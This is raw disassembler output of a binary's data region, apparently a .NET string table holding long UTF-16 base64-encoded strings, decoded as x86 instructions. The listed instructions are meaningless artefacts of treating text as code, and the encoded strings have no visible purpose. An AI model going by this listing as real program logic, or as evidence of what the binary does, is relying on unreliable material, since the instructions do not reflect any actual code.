  40b9b9:	68 00 77 00 39       	push   $0x39007700
  40b9be:	00 35 00 34 00 32    	add    %dh,0x32003400
  40b9c4:	00 55 00             	add    %dl,0x0(%ebp)
  40b9c7:	72 00                	jb     0x40b9c9
  40b9c9:	2b 00                	sub    (%eax),%eax
  40b9cb:	6b 00 78             	imul   $0x78,(%eax),%eax
  40b9ce:	00 79 00             	add    %bh,0x0(%ecx)
  40b9d1:	54                   	push   %esp
  40b9d2:	00 53 00             	add    %dl,0x0(%ebx)
  40b9d5:	6c                   	insb   (%dx),%es:(%edi)
  40b9d6:	00 52 00             	add    %dl,0x0(%edx)
  40b9d9:	33 00                	xor    (%eax),%eax
  40b9db:	31 00                	xor    %eax,(%eax)
  40b9dd:	39 00                	cmp    %eax,(%eax)
  40b9df:	7a 00                	jp     0x40b9e1
  40b9e1:	31 00                	xor    %eax,(%eax)
  40b9e3:	50                   	push   %eax
  40b9e4:	00 57 00             	add    %dl,0x0(%edi)
  40b9e7:	37                   	aaa
  40b9e8:	00 50 00             	add    %dl,0x0(%eax)
  40b9eb:	4d                   	dec    %ebp
  40b9ec:	00 45 00             	add    %al,0x0(%ebp)
  40b9ef:	6f                   	outsl  %ds:(%esi),(%dx)
  40b9f0:	00 68 00             	add    %ch,0x0(%eax)
  40b9f3:	4f                   	dec    %edi
  40b9f4:	00 6b 00             	add    %ch,0x0(%ebx)
  40b9f7:	42                   	inc    %edx
  40b9f8:	00 6c 00 55          	add    %ch,0x55(%eax,%eax,1)
  40b9fc:	00 64 00 5a          	add    %ah,0x5a(%eax,%eax,1)
  40ba00:	00 61 00             	add    %ah,0x0(%ecx)
  40ba03:	4c                   	dec    %esp
  40ba04:	00 67 00             	add    %ah,0x0(%edi)
  40ba07:	61                   	popa
  40ba08:	00 52 00             	add    %dl,0x0(%edx)
  40ba0b:	46                   	inc    %esi
  40ba0c:	00 30                	add    %dh,(%eax)
  40ba0e:	00 56 00             	add    %dl,0x0(%esi)
  40ba11:	38 00                	cmp    %al,(%eax)
  40ba13:	56                   	push   %esi
  40ba14:	00 4b 00             	add    %cl,0x0(%ebx)
  40ba17:	5a                   	pop    %edx
  40ba18:	00 72 00             	add    %dh,0x0(%edx)
  40ba1b:	6a 00                	push   $0x0
  40ba1d:	32 00                	xor    (%eax),%al
  40ba1f:	72 00                	jb     0x40ba21
  40ba21:	4b                   	dec    %ebx
  40ba22:	00 37                	add    %dh,(%edi)
  40ba24:	00 54 00 4c          	add    %dl,0x4c(%eax,%eax,1)
  40ba28:	00 37                	add    %dh,(%edi)
  40ba2a:	00 66 00             	add    %ah,0x0(%esi)
  40ba2d:	43                   	inc    %ebx
  40ba2e:	00 58 00             	add    %bl,0x0(%eax)
  40ba31:	57                   	push   %edi
  40ba32:	00 41 00             	add    %al,0x0(%ecx)
  40ba35:	62 00                	bound  %eax,(%eax)
  40ba37:	38 00                	cmp    %al,(%eax)
  40ba39:	32 00                	xor    (%eax),%al
  40ba3b:	43                   	inc    %ebx
  40ba3c:	00 41 00             	add    %al,0x0(%ecx)
  40ba3f:	52                   	push   %edx
  40ba40:	00 45 00             	add    %al,0x0(%ebp)
  40ba43:	48                   	dec    %eax
  40ba44:	00 44 00 57          	add    %al,0x57(%eax,%eax,1)
  40ba48:	00 50 00             	add    %dl,0x0(%eax)
  40ba4b:	33 00                	xor    (%eax),%eax
  40ba4d:	64 00 78 00          	add    %bh,%fs:0x0(%eax)
  40ba51:	68 00 75 00 79       	push   $0x79007500
  40ba56:	00 72 00             	add    %dh,0x0(%edx)
  40ba59:	42                   	inc    %edx
  40ba5a:	00 67 00             	add    %ah,0x0(%edi)
  40ba5d:	59                   	pop    %ecx
  40ba5e:	00 70 00             	add    %dh,0x0(%eax)
  40ba61:	5a                   	pop    %edx
  40ba62:	00 30                	add    %dh,(%eax)
  40ba64:	00 6e 00             	add    %ch,0x0(%esi)
  40ba67:	4a                   	dec    %edx
  40ba68:	00 48 00             	add    %cl,0x0(%eax)
  40ba6b:	4b                   	dec    %ebx
  40ba6c:	00 59 00             	add    %bl,0x0(%ecx)
  40ba6f:	38 00                	cmp    %al,(%eax)
  40ba71:	53                   	push   %ebx
  40ba72:	00 62 00             	add    %ah,0x0(%edx)
  40ba75:	48                   	dec    %eax
  40ba76:	00 33                	add    %dh,(%ebx)
  40ba78:	00 50 00             	add    %dl,0x0(%eax)
  40ba7b:	55                   	push   %ebp
  40ba7c:	00 69 00             	add    %ch,0x0(%ecx)
  40ba7f:	70 00                	jo     0x40ba81
  40ba81:	69 00 45 00 5a 00    	imul   $0x5a0045,(%eax),%eax
  40ba87:	55                   	push   %ebp
  40ba88:	00 45 00             	add    %al,0x0(%ebp)
  40ba8b:	4f                   	dec    %edi
  40ba8c:	00 38                	add    %bh,(%eax)
  40ba8e:	00 61 00             	add    %ah,0x0(%ecx)
  40ba91:	59                   	pop    %ecx
  40ba92:	00 77 00             	add    %dh,0x0(%edi)
  40ba95:	46                   	inc    %esi
  40ba96:	00 41 00             	add    %al,0x0(%ecx)
  40ba99:	4a                   	dec    %edx
  40ba9a:	00 2f                	add    %ch,(%edi)
  40ba9c:	00 42 00             	add    %al,0x0(%edx)
  40ba9f:	38 00                	cmp    %al,(%eax)
  40baa1:	56                   	push   %esi
  40baa2:	00 41 00             	add    %al,0x0(%ecx)
  40baa5:	43                   	inc    %ebx
  40baa6:	00 43 00             	add    %al,0x0(%ebx)
  40baa9:	30 00                	xor    %al,(%eax)
  40baab:	4f                   	dec    %edi
  40baac:	00 2b                	add    %ch,(%ebx)
  40baae:	00 42 00             	add    %al,0x0(%edx)
  40bab1:	7a 00                	jp     0x40bab3
  40bab3:	77 00                	ja     0x40bab5
  40bab5:	70 00                	jo     0x40bab7
  40bab7:	56                   	push   %esi
  40bab8:	00 76 00             	add    %dh,0x0(%esi)
  40babb:	4b                   	dec    %ebx
  40babc:	00 30                	add    %dh,(%eax)
  40babe:	00 57 00             	add    %dl,0x0(%edi)
  40bac1:	41                   	inc    %ecx
  40bac2:	00 70 00             	add    %dh,0x0(%eax)
  40bac5:	38 00                	cmp    %al,(%eax)
  40bac7:	6f                   	outsl  %ds:(%esi),(%dx)
  40bac8:	00 75 00             	add    %dh,0x0(%ebp)
  40bacb:	76 00                	jbe    0x40bacd
  40bacd:	65 00 33             	add    %dh,%gs:(%ebx)
  40bad0:	00 5a 00             	add    %bl,0x0(%edx)
  40bad3:	49                   	dec    %ecx
  40bad4:	00 4b 00             	add    %cl,0x0(%ebx)
  40bad7:	4f                   	dec    %edi
  40bad8:	00 61 00             	add    %ah,0x0(%ecx)
  40badb:	2b 00                	sub    (%eax),%eax
  40badd:	70 00                	jo     0x40badf
  40badf:	44                   	inc    %esp
  40bae0:	00 48 00             	add    %cl,0x0(%eax)
  40bae3:	61                   	popa
  40bae4:	00 33                	add    %dh,(%ebx)
  40bae6:	00 33                	add    %dh,(%ebx)
  40bae8:	00 5a 00             	add    %bl,0x0(%edx)
  40baeb:	78 00                	js     0x40baed
  40baed:	42                   	inc    %edx
  40baee:	00 38                	add    %bh,(%eax)
  40baf0:	00 49 00             	add    %cl,0x0(%ecx)
  40baf3:	66 00 44 00 62       	data16 add %al,0x62(%eax,%eax,1)
  40baf8:	00 36                	add    %dh,(%esi)
  40bafa:	00 76 00             	add    %dh,0x0(%esi)
  40bafd:	76 00                	jbe    0x40baff
  40baff:	6f                   	outsl  %ds:(%esi),(%dx)
  40bb00:	00 75 00             	add    %dh,0x0(%ebp)
  40bb03:	6d                   	insl   (%dx),%es:(%edi)
  40bb04:	00 68 00             	add    %ch,0x0(%eax)
  40bb07:	51                   	push   %ecx
  40bb08:	00 2f                	add    %ch,(%edi)
  40bb0a:	00 38                	add    %bh,(%eax)
  40bb0c:	00 55 00             	add    %dl,0x0(%ebp)
  40bb0f:	44                   	inc    %esp
  40bb10:	00 4f 00             	add    %cl,0x0(%edi)
  40bb13:	2f                   	das
  40bb14:	00 49 00             	add    %cl,0x0(%ecx)
  40bb17:	57                   	push   %edi
  40bb18:	00 58 00             	add    %bl,0x0(%eax)
  40bb1b:	79 00                	jns    0x40bb1d
  40bb1d:	70 00                	jo     0x40bb1f
  40bb1f:	5a                   	pop    %edx
  40bb20:	00 58 00             	add    %bl,0x0(%eax)
  40bb23:	4a                   	dec    %edx
  40bb24:	00 6b 00             	add    %ch,0x0(%ebx)
  40bb27:	35 00 63 00 57       	xor    $0x57006300,%eax
  40bb2c:	00 58 00             	add    %bl,0x0(%eax)
  40bb2f:	37                   	aaa
  40bb30:	00 70 00             	add    %dh,0x0(%eax)
  40bb33:	6c                   	insb   (%dx),%es:(%edi)
  40bb34:	00 34 00             	add    %dh,(%eax,%eax,1)
  40bb37:	7a 00                	jp     0x40bb39
  40bb39:	70 00                	jo     0x40bb3b
  40bb3b:	59                   	pop    %ecx
  40bb3c:	00 71 00             	add    %dh,0x0(%ecx)
  40bb3f:	6e                   	outsb  %ds:(%esi),(%dx)
  40bb40:	00 69 00             	add    %ch,0x0(%ecx)
  40bb43:	78 00                	js     0x40bb45
  40bb45:	6c                   	insb   (%dx),%es:(%edi)
  40bb46:	00 39                	add    %bh,(%ecx)
  40bb48:	00 4d 00             	add    %cl,0x0(%ebp)
  40bb4b:	6d                   	insl   (%dx),%es:(%edi)
  40bb4c:	00 4b 00             	add    %cl,0x0(%ebx)
  40bb4f:	48                   	dec    %eax
  40bb50:	00 6e 00             	add    %ch,0x0(%esi)
  40bb53:	57                   	push   %edi
  40bb54:	00 6c 00 52          	add    %ch,0x52(%eax,%eax,1)
  40bb58:	00 4a 00             	add    %cl,0x0(%edx)
  40bb5b:	7a 00                	jp     0x40bb5d
  40bb5d:	4f                   	dec    %edi
  40bb5e:	00 47 00             	add    %al,0x0(%edi)
  40bb61:	73 00                	jae    0x40bb63
  40bb63:	38 00                	cmp    %al,(%eax)
  40bb65:	74 00                	je     0x40bb67
  40bb67:	30 00                	xor    %al,(%eax)
  40bb69:	36 00 70 00          	add    %dh,%ss:0x0(%eax)
  40bb6d:	70 00                	jo     0x40bb6f
  40bb6f:	38 00                	cmp    %al,(%eax)
  40bb71:	57                   	push   %edi
  40bb72:	00 46 00             	add    %al,0x0(%esi)
  40bb75:	67 00 2b             	add    %ch,(%bp,%di)
  40bb78:	00 6c 00 2b          	add    %ch,0x2b(%eax,%eax,1)
  40bb7c:	00 66 00             	add    %ah,0x0(%esi)
  40bb7f:	48                   	dec    %eax
  40bb80:	00 63 00             	add    %ah,0x0(%ebx)
  40bb83:	5a                   	pop    %edx
  40bb84:	00 69 00             	add    %ch,0x0(%ecx)
  40bb87:	45                   	inc    %ebp
  40bb88:	00 4d 00             	add    %cl,0x0(%ebp)
  40bb8b:	77 00                	ja     0x40bb8d
  40bb8d:	76 00                	jbe    0x40bb8f
  40bb8f:	6c                   	insb   (%dx),%es:(%edi)
  40bb90:	00 73 00             	add    %dh,0x0(%ebx)
  40bb93:	42                   	inc    %edx
  40bb94:	00 35 00 68 00 67    	add    %dh,0x67006800
  40bb9a:	00 4a 00             	add    %cl,0x0(%edx)
  40bb9d:	59                   	pop    %ecx
  40bb9e:	00 61 00             	add    %ah,0x0(%ecx)
  40bba1:	53                   	push   %ebx
  40bba2:	00 2b                	add    %ch,(%ebx)
  40bba4:	00 64 00 66          	add    %ah,0x66(%eax,%eax,1)
  40bba8:	00 4b 00             	add    %cl,0x0(%ebx)
  40bbab:	30 00                	xor    %al,(%eax)
  40bbad:	47                   	inc    %edi
  40bbae:	00 35 00 75 00 65    	add    %dh,0x65007500
  40bbb4:	00 59 00             	add    %bl,0x0(%ecx)
  40bbb7:	62 00                	bound  %eax,(%eax)
  40bbb9:	52                   	push   %edx
  40bbba:	00 62 00             	add    %ah,0x0(%edx)
  40bbbd:	55                   	push   %ebp
  40bbbe:	00 6a 00             	add    %ch,0x0(%edx)
  40bbc1:	73 00                	jae    0x40bbc3
  40bbc3:	73 00                	jae    0x40bbc5
  40bbc5:	55                   	push   %ebp
  40bbc6:	00 52 00             	add    %dl,0x0(%edx)
  40bbc9:	46                   	inc    %esi
  40bbca:	00 47 00             	add    %al,0x0(%edi)
  40bbcd:	6b 00 39             	imul   $0x39,(%eax),%eax
  40bbd0:	00 4f 00             	add    %cl,0x0(%edi)
  40bbd3:	4c                   	dec    %esp
  40bbd4:	00 68 00             	add    %ch,0x0(%eax)
  40bbd7:	48                   	dec    %eax
  40bbd8:	00 75 00             	add    %dh,0x0(%ebp)
  40bbdb:	34 00                	xor    $0x0,%al
  40bbdd:	53                   	push   %ebx
  40bbde:	00 6d 00             	add    %ch,0x0(%ebp)
  40bbe1:	62 00                	bound  %eax,(%eax)
  40bbe3:	39 00                	cmp    %eax,(%eax)
  40bbe5:	7a 00                	jp     0x40bbe7
  40bbe7:	59                   	pop    %ecx
  40bbe8:	00 53 00             	add    %dl,0x0(%ebx)
  40bbeb:	6f                   	outsl  %ds:(%esi),(%dx)
  40bbec:	00 79 00             	add    %bh,0x0(%ecx)
  40bbef:	56                   	push   %esi
  40bbf0:	00 44 00 4f          	add    %al,0x4f(%eax,%eax,1)
  40bbf4:	00 6d 00             	add    %ch,0x0(%ebp)
  40bbf7:	61                   	popa
  40bbf8:	00 70 00             	add    %dh,0x0(%eax)
  40bbfb:	77 00                	ja     0x40bbfd
  40bbfd:	30 00                	xor    %al,(%eax)
  40bbff:	41                   	inc    %ecx
  40bc00:	00 73 00             	add    %dh,0x0(%ebx)
  40bc03:	56                   	push   %esi
  40bc04:	00 57 00             	add    %dl,0x0(%edi)
  40bc07:	53                   	push   %ebx
  40bc08:	00 62 00             	add    %ah,0x0(%edx)
  40bc0b:	2f                   	das
  40bc0c:	00 56 00             	add    %dl,0x0(%esi)
  40bc0f:	34 00                	xor    $0x0,%al
  40bc11:	32 00                	xor    (%eax),%al
  40bc13:	2f                   	das
  40bc14:	00 43 00             	add    %al,0x0(%ebx)
  40bc17:	49                   	dec    %ecx
  40bc18:	00 32                	add    %dh,(%edx)
  40bc1a:	00 2b                	add    %ch,(%ebx)
  40bc1c:	00 36                	add    %dh,(%esi)
  40bc1e:	00 6f 00             	add    %ch,0x0(%edi)
  40bc21:	4f                   	dec    %edi
  40bc22:	00 66 00             	add    %ah,0x0(%esi)
  40bc25:	42                   	inc    %edx
  40bc26:	00 42 00             	add    %al,0x0(%edx)
  40bc29:	33 00                	xor    (%eax),%eax
  40bc2b:	45                   	inc    %ebp
  40bc2c:	00 54 00 72          	add    %dl,0x72(%eax,%eax,1)
  40bc30:	00 79 00             	add    %bh,0x0(%ecx)
  40bc33:	75 00                	jne    0x40bc35
  40bc35:	44                   	inc    %esp
  40bc36:	00 37                	add    %dh,(%edi)
  40bc38:	00 54 00 64          	add    %dl,0x64(%eax,%eax,1)
  40bc3c:	00 30                	add    %dh,(%eax)
  40bc3e:	00 76 00             	add    %dh,0x0(%esi)
  40bc41:	59                   	pop    %ecx
  40bc42:	00 47 00             	add    %al,0x0(%edi)
  40bc45:	4e                   	dec    %esi
  40bc46:	00 6c 00 32          	add    %ch,0x32(%eax,%eax,1)
  40bc4a:	00 69 00             	add    %ch,0x0(%ecx)
  40bc4d:	63 00                	arpl   %eax,(%eax)
  40bc4f:	6e                   	outsb  %ds:(%esi),(%dx)
  40bc50:	00 47 00             	add    %al,0x0(%edi)
  40bc53:	79 00                	jns    0x40bc55
  40bc55:	35 00 66 00 4b       	xor    $0x4b006600,%eax
  40bc5a:	00 35 00 4c 00 2b    	add    %dh,0x2b004c00
  40bc60:	00 42 00             	add    %al,0x0(%edx)
  40bc63:	55                   	push   %ebp
  40bc64:	00 31                	add    %dh,(%ecx)
  40bc66:	00 2b                	add    %ch,(%ebx)
  40bc68:	00 41 00             	add    %al,0x0(%ecx)
  40bc6b:	77 00                	ja     0x40bc6d
  40bc6d:	67 00 5a 00          	add    %bl,0x0(%bp,%si)
  40bc71:	2f                   	das
  40bc72:	00 4a 00             	add    %cl,0x0(%edx)
  40bc75:	42                   	inc    %edx
  40bc76:	00 52 00             	add    %dl,0x0(%edx)
  40bc79:	33 00                	xor    (%eax),%eax
  40bc7b:	32 00                	xor    (%eax),%al
  40bc7d:	79 00                	jns    0x40bc7f
  40bc7f:	71 00                	jno    0x40bc81
  40bc81:	5a                   	pop    %edx
  40bc82:	00 7a 00             	add    %bh,0x0(%edx)
  40bc85:	73 00                	jae    0x40bc87
  40bc87:	34 00                	xor    $0x0,%al
  40bc89:	49                   	dec    %ecx
  40bc8a:	00 32                	add    %dh,(%edx)
  40bc8c:	00 76 00             	add    %dh,0x0(%esi)
  40bc8f:	76 00                	jbe    0x40bc91
  40bc91:	6c                   	insb   (%dx),%es:(%edi)
  40bc92:	00 4a 00             	add    %cl,0x0(%edx)
  40bc95:	55                   	push   %ebp
  40bc96:	00 34 00             	add    %dh,(%eax,%eax,1)
  40bc99:	75 00                	jne    0x40bc9b
  40bc9b:	45                   	inc    %ebp
  40bc9c:	00 45 00             	add    %al,0x0(%ebp)
  40bc9f:	47                   	inc    %edi
  40bca0:	00 34 00             	add    %dh,(%eax,%eax,1)
  40bca3:	7a 00                	jp     0x40bca5
  40bca5:	2f                   	das
  40bca6:	00 5a 00             	add    %bl,0x0(%edx)
  40bca9:	2f                   	das
  40bcaa:	00 66 00             	add    %ah,0x0(%esi)
  40bcad:	75 00                	jne    0x40bcaf
  40bcaf:	74 00                	je     0x40bcb1
  40bcb1:	4c                   	dec    %esp
  40bcb2:	00 47 00             	add    %al,0x0(%edi)
  40bcb5:	58                   	pop    %eax
  40bcb6:	00 7a 00             	add    %bh,0x0(%edx)
  40bcb9:	58                   	pop    %eax
  40bcba:	00 52 00             	add    %dl,0x0(%edx)
  40bcbd:	47                   	inc    %edi
  40bcbe:	00 54 00 6a          	add    %dl,0x6a(%eax,%eax,1)
  40bcc2:	00 32                	add    %dh,(%edx)
  40bcc4:	00 4f 00             	add    %cl,0x0(%edi)
  40bcc7:	78 00                	js     0x40bcc9
  40bcc9:	37                   	aaa
  40bcca:	00 51 00             	add    %dl,0x0(%ecx)
  40bccd:	4b                   	dec    %ebx
  40bcce:	00 45 00             	add    %al,0x0(%ebp)
  40bcd1:	77 00                	ja     0x40bcd3
  40bcd3:	74 00                	je     0x40bcd5
  40bcd5:	55                   	push   %ebp
  40bcd6:	00 75 00             	add    %dh,0x0(%ebp)
  40bcd9:	44                   	inc    %esp
  40bcda:	00 71 00             	add    %dh,0x0(%ecx)
  40bcdd:	4f                   	dec    %edi
  40bcde:	00 70 00             	add    %dh,0x0(%eax)
  40bce1:	34 00                	xor    $0x0,%al
  40bce3:	65 00 62 00          	add    %ah,%gs:0x0(%edx)
  40bce7:	36 00 6a 00          	add    %ch,%ss:0x0(%edx)
  40bceb:	4a                   	dec    %edx
  40bcec:	00 70 00             	add    %dh,0x0(%eax)
  40bcef:	32 00                	xor    (%eax),%al
  40bcf1:	49                   	dec    %ecx
  40bcf2:	00 77 00             	add    %dh,0x0(%edi)
  40bcf5:	47                   	inc    %edi
  40bcf6:	00 6e 00             	add    %ch,0x0(%esi)
  40bcf9:	5a                   	pop    %edx
  40bcfa:	00 73 00             	add    %dh,0x0(%ebx)
  40bcfd:	62 00                	bound  %eax,(%eax)
  40bcff:	73 00                	jae    0x40bd01
  40bd01:	6b 00 51             	imul   $0x51,(%eax),%eax
  40bd04:	00 61 00             	add    %ah,0x0(%ecx)
  40bd07:	2b 00                	sub    (%eax),%eax
  40bd09:	54                   	push   %esp
  40bd0a:	00 30                	add    %dh,(%eax)
  40bd0c:	00 4b 00             	add    %cl,0x0(%ebx)
  40bd0f:	35 00 6b 00 61       	xor    $0x61006b00,%eax
  40bd14:	00 49 00             	add    %cl,0x0(%ecx)
  40bd17:	55                   	push   %ebp
  40bd18:	00 61 00             	add    %ah,0x0(%ecx)
  40bd1b:	33 00                	xor    (%eax),%eax
  40bd1d:	6f                   	outsl  %ds:(%esi),(%dx)
  40bd1e:	00 77 00             	add    %dh,0x0(%edi)
  40bd21:	63 00                	arpl   %eax,(%eax)
  40bd23:	66 00 79 00          	data16 add %bh,0x0(%ecx)
  40bd27:	35 00 4e 00 53       	xor    $0x53004e00,%eax
  40bd2c:	00 57 00             	add    %dl,0x0(%edi)
  40bd2f:	39 00                	cmp    %eax,(%eax)
  40bd31:	55                   	push   %ebp
  40bd32:	00 47 00             	add    %al,0x0(%edi)
  40bd35:	66 00 45 00          	data16 add %al,0x0(%ebp)
  40bd39:	41                   	inc    %ecx
  40bd3a:	00 74 00 43          	add    %dh,0x43(%eax,%eax,1)
  40bd3e:	00 35 00 6f 00 58    	add    %dh,0x58006f00
  40bd44:	00 6f 00             	add    %ch,0x0(%edi)
  40bd47:	38 00                	cmp    %al,(%eax)
  40bd49:	34 00                	xor    $0x0,%al
  40bd4b:	4d                   	dec    %ebp
  40bd4c:	00 44 00 50          	add    %al,0x50(%eax,%eax,1)
  40bd50:	00 62 00             	add    %ah,0x0(%edx)
  40bd53:	55                   	push   %ebp
  40bd54:	00 76 00             	add    %dh,0x0(%esi)
  40bd57:	73 00                	jae    0x40bd59
  40bd59:	51                   	push   %ecx
  40bd5a:	00 41 00             	add    %al,0x0(%ecx)
  40bd5d:	5a                   	pop    %edx
  40bd5e:	00 69 00             	add    %ch,0x0(%ecx)
  40bd61:	43                   	inc    %ebx
  40bd62:	00 78 00             	add    %bh,0x0(%eax)
  40bd65:	6f                   	outsl  %ds:(%esi),(%dx)
  40bd66:	00 50 00             	add    %dl,0x0(%eax)
  40bd69:	37                   	aaa
  40bd6a:	00 37                	add    %dh,(%edi)
  40bd6c:	00 77 00             	add    %dh,0x0(%edi)
  40bd6f:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  40bd73:	68 00 59 00 4a       	push   $0x4a005900
  40bd78:	00 5a 00             	add    %bl,0x0(%edx)
  40bd7b:	76 00                	jbe    0x40bd7d
  40bd7d:	46                   	inc    %esi
  40bd7e:	00 51 00             	add    %dl,0x0(%ecx)
  40bd81:	52                   	push   %edx
  40bd82:	00 48 00             	add    %cl,0x0(%eax)
  40bd85:	59                   	pop    %ecx
  40bd86:	00 67 00             	add    %ah,0x0(%edi)
  40bd89:	2b 00                	sub    (%eax),%eax
  40bd8b:	45                   	inc    %ebp
  40bd8c:	00 35 00 6c 00 33    	add    %dh,0x33006c00
  40bd92:	00 33                	add    %dh,(%ebx)
  40bd94:	00 47 00             	add    %al,0x0(%edi)
  40bd97:	53                   	push   %ebx
  40bd98:	00 52 00             	add    %dl,0x0(%edx)
  40bd9b:	59                   	pop    %ecx
  40bd9c:	00 49 00             	add    %cl,0x0(%ecx)
  40bd9f:	70 00                	jo     0x40bda1
  40bda1:	73 00                	jae    0x40bda3
  40bda3:	65 00 55 00          	add    %dl,%gs:0x0(%ebp)
  40bda7:	63 00                	arpl   %eax,(%eax)
  40bda9:	67 00 43 00          	add    %al,0x0(%bp,%di)
  40bdad:	64 00 35 00 63 00 50 	add    %dh,%fs:0x50006300
  40bdb4:	00 45 00             	add    %al,0x0(%ebp)
  40bdb7:	74 00                	je     0x40bdb9
  40bdb9:	32 00                	xor    (%eax),%al
  40bdbb:	64 00 46 00          	add    %al,%fs:0x0(%esi)
  40bdbf:	4e                   	dec    %esi
  40bdc0:	00 69 00             	add    %ch,0x0(%ecx)
  40bdc3:	49                   	dec    %ecx
  40bdc4:	00 31                	add    %dh,(%ecx)
  40bdc6:	00 63 00             	add    %ah,0x0(%ebx)
  40bdc9:	4f                   	dec    %edi
  40bdca:	00 39                	add    %bh,(%ecx)
  40bdcc:	00 62 00             	add    %ah,0x0(%edx)
  40bdcf:	51                   	push   %ecx
  40bdd0:	00 52 00             	add    %dl,0x0(%edx)
  40bdd3:	2f                   	das
  40bdd4:	00 4b 00             	add    %cl,0x0(%ebx)
  40bdd7:	47                   	inc    %edi
  40bdd8:	00 65 00             	add    %ah,0x0(%ebp)
  40bddb:	58                   	pop    %eax
  40bddc:	00 59 00             	add    %bl,0x0(%ecx)
  40bddf:	4c                   	dec    %esp
  40bde0:	00 77 00             	add    %dh,0x0(%edi)
  40bde3:	74 00                	je     0x40bde5
  40bde5:	65 00 64 00 66       	add    %ah,%gs:0x66(%eax,%eax,1)
  40bdea:	00 46 00             	add    %al,0x0(%esi)
  40bded:	50                   	push   %eax
  40bdee:	00 30                	add    %dh,(%eax)
  40bdf0:	00 54 00 43          	add    %dl,0x43(%eax,%eax,1)
  40bdf4:	00 59 00             	add    %bl,0x0(%ecx)
  40bdf7:	73 00                	jae    0x40bdf9
  40bdf9:	37                   	aaa
  40bdfa:	00 76 00             	add    %dh,0x0(%esi)
  40bdfd:	78 00                	js     0x40bdff
  40bdff:	64 00 43 00          	add    %al,%fs:0x0(%ebx)
  40be03:	6f                   	outsl  %ds:(%esi),(%dx)
  40be04:	00 31                	add    %dh,(%ecx)
  40be06:	00 73 00             	add    %dh,0x0(%ebx)
  40be09:	7a 00                	jp     0x40be0b
  40be0b:	48                   	dec    %eax
  40be0c:	00 4f 00             	add    %cl,0x0(%edi)
  40be0f:	58                   	pop    %eax
  40be10:	00 6f 00             	add    %ch,0x0(%edi)
  40be13:	41                   	inc    %ecx
  40be14:	00 3d 00 3d 00 00    	add    %bh,0x3d00
  40be1a:	80 b1 66 00 42 00 59 	xorb   $0x59,0x420066(%ecx)
  40be21:	00 54 00 4e          	add    %dl,0x4e(%eax,%eax,1)
  40be25:	00 64 00 53          	add    %ah,0x53(%eax,%eax,1)
  40be29:	00 2b                	add    %ch,(%ebx)
  40be2b:	00 4d 00             	add    %cl,0x0(%ebp)
  40be2e:	50                   	push   %eax
  40be2f:	00 2b                	add    %ch,(%ebx)
  40be31:	00 39                	add    %bh,(%ecx)
  40be33:	00 62 00             	add    %ah,0x0(%edx)
  40be36:	6a 00                	push   $0x0
  40be38:	69 00 78 00 31 00    	imul   $0x310078,(%eax),%eax
  40be3e:	34 00                	xor    $0x0,%al
  40be40:	6e                   	outsb  %ds:(%esi),(%dx)
  40be41:	00 67 00             	add    %ah,0x0(%edi)
  40be44:	4c                   	dec    %esp
  40be45:	00 77 00             	add    %dh,0x0(%edi)
  40be48:	61                   	popa
  40be49:	00 49 00             	add    %cl,0x0(%ecx)
  40be4c:	70 00                	jo     0x40be4e
  40be4e:	73 00                	jae    0x40be50
  40be50:	78 00                	js     0x40be52
  40be52:	59                   	pop    %ecx
  40be53:	00 73 00             	add    %dh,0x0(%ebx)
  40be56:	48                   	dec    %eax
  40be57:	00 30                	add    %dh,(%eax)
  40be59:	00 71 00             	add    %dh,0x0(%ecx)
  40be5c:	54                   	push   %esp
  40be5d:	00 50 00             	add    %dl,0x0(%eax)
  40be60:	59                   	pop    %ecx
  40be61:	00 75 00             	add    %dh,0x0(%ebp)
  40be64:	33 00                	xor    (%eax),%eax
  40be66:	72 00                	jb     0x40be68
  40be68:	37                   	aaa
  40be69:	00 64 00 72          	add    %ah,0x72(%eax,%eax,1)
  40be6d:	00 6b 00             	add    %ch,0x0(%ebx)
  40be70:	51                   	push   %ecx
  40be71:	00 43 00             	add    %al,0x0(%ebx)
  40be74:	69 00 37 00 66 00    	imul   $0x660037,(%eax),%eax
  40be7a:	45                   	inc    %ebp
  40be7b:	00 6f 00             	add    %ch,0x0(%edi)
  40be7e:	63 00                	arpl   %eax,(%eax)
  40be80:	50                   	push   %eax
  40be81:	00 70 00             	add    %dh,0x0(%eax)
  40be84:	56                   	push   %esi
  40be85:	00 4a 00             	add    %cl,0x0(%edx)
  40be88:	2f                   	das
  40be89:	00 67 00             	add    %ah,0x0(%edi)
  40be8c:	66 00 77 00          	data16 add %dh,0x0(%edi)
  40be90:	34 00                	xor    $0x0,%al
  40be92:	71 00                	jno    0x40be94
  40be94:	56                   	push   %esi
  40be95:	00 46 00             	add    %al,0x0(%esi)
  40be98:	6c                   	insb   (%dx),%es:(%edi)
  40be99:	00 4f 00             	add    %cl,0x0(%edi)
  40be9c:	2f                   	das
  40be9d:	00 54 00 36          	add    %dl,0x36(%eax,%eax,1)
  40bea1:	00 71 00             	add    %dh,0x0(%ecx)
  40bea4:	2b 00                	sub    (%eax),%eax
  40bea6:	47                   	inc    %edi
  40bea7:	00 62 00             	add    %ah,0x0(%edx)
  40beaa:	72 00                	jb     0x40beac
  40beac:	46                   	inc    %esi
  40bead:	00 43 00             	add    %al,0x0(%ebx)
  40beb0:	2f                   	das
  40beb1:	00 47 00             	add    %al,0x0(%edi)
  40beb4:	2b 00                	sub    (%eax),%eax
  40beb6:	35 00 74 00 35       	xor    $0x35007400,%eax
  40bebb:	00 39                	add    %bh,(%ecx)
  40bebd:	00 2b                	add    %ch,(%ebx)
  40bebf:	00 79 00             	add    %bh,0x0(%ecx)
  40bec2:	6f                   	outsl  %ds:(%esi),(%dx)
  40bec3:	00 79 00             	add    %bh,0x0(%ecx)
  40bec6:	77 00                	ja     0x40bec8
  40bec8:	3d 00 3d 00 00       	cmp    $0x3d00,%eax
  40becd:	80 b1 6a 00 7a 00 79 	xorb   $0x79,0x7a006a(%ecx)
  40bed4:	00 52 00             	add    %dl,0x0(%edx)
  40bed7:	4c                   	dec    %esp
  40bed8:	00 79 00             	add    %bh,0x0(%ecx)
  40bedb:	49                   	dec    %ecx
  40bedc:	00 55 00             	add    %dl,0x0(%ebp)
  40bedf:	43                   	inc    %ebx
  40bee0:	00 52 00             	add    %dl,0x0(%edx)
  40bee3:	79 00                	jns    0x40bee5
  40bee5:	31 00                	xor    %eax,(%eax)
  40bee7:	75 00                	jne    0x40bee9
  40bee9:	38 00                	cmp    %al,(%eax)
  40beeb:	50                   	push   %eax
  40beec:	00 51 00             	add    %dl,0x0(%ecx)
  40beef:	4e                   	dec    %esi
  40bef0:	00 50 00             	add    %dl,0x0(%eax)
  40bef3:	34 00                	xor    $0x0,%al
